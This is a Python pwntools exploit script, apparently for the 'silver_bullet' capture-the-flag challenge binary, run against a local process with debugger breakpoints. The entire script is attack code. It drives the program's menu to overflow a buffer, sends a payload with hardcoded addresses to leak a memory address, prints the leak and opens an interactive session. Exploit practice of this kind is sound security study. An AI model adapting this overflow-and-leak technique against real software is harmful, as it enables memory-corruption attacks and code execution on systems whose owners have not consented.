

from pwn import *
import pdb


def create(cont):
  p.sendlineafter('Your choice :', '1')
  p.sendlineafter('Give me your description of bullet :', cont)

def powerup(cont):
  p.sendlineafter('Your choice :', '2')
  p.sendafter('Give me your another description of bullet :', cont)

def beat():
  p.sendlineafter('Your choice :', '3')


p = process('/home/len/pwnable/silver_bullet')
context.log_level = 'debug'

if __name__ == "__main__":
  pdb.set_trace()

  create('a' * 0x2f)
  powerup('b' * 2)

  
  payload = '\xff'*3 # + 'a' * 4

  payload += p32(0x804AFF8)
  payload += p32(0x80484A8)

  # finit 0x804aedc

  # for i in range(10):
  #   payload += chr(ord('a')+i) * 4

  payload += 'c' * 4 + p32(0x804AFF8)

  pdb.set_trace()
  powerup(payload)

  beat()
  p.recvuntil('Oh ! You win !!\n')
  cont = p.recv(4)
  print('{:#x}'.format(u32(cont)))

  p.interactive()